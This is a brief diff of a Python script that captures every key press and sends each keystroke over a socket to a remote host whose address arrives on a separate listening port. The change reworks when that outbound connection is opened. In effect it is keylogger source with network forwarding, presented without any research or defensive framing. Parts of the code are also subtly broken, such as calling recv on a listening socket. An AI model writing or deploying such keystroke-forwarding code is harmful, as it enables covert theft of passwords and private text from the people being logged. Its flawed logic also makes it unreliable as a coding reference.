@@ -11,11 +11,9 @@ transferPort = 5052
 receiveSocker = socket.socket()
 receiveSocker.bind((localHost, receivePort))
 receiveSocker.listen(5)
-transferSocket = socket.socket()
-transferSocket.connect((transferHost, transferPort))
 
 
-def receive(port):
+def receive():
     while True:
         c, addr = receiveSocker.accept()
         transferHost = receiveSocker.recv(20)
@@ -24,11 +22,12 @@ def receive(port):
 
 
 def on_press(key):
+    transferSocket = socket.socket()
+    transferSocket.connect((transferHost, transferPort))
     key = str(key).encode()
     transferSocket.send(key)
-    # 监听按键
-    # print('{0} pressed'.format(key))
     print(key)
+    transferSocket.close()
 
 
 def on_release(key):
